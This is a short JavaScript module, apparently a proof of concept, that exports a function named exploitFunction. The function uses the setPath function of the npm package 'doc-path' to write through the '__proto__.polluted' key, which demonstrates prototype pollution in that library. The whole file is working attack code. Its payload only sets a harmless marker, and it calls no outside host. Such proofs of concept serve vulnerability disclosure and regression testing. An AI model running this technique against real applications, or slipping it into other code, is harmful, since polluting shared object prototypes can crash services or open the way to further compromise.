function exploitFunction(payload) {
    const path = require("doc-path");

    path.setPath(payload, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };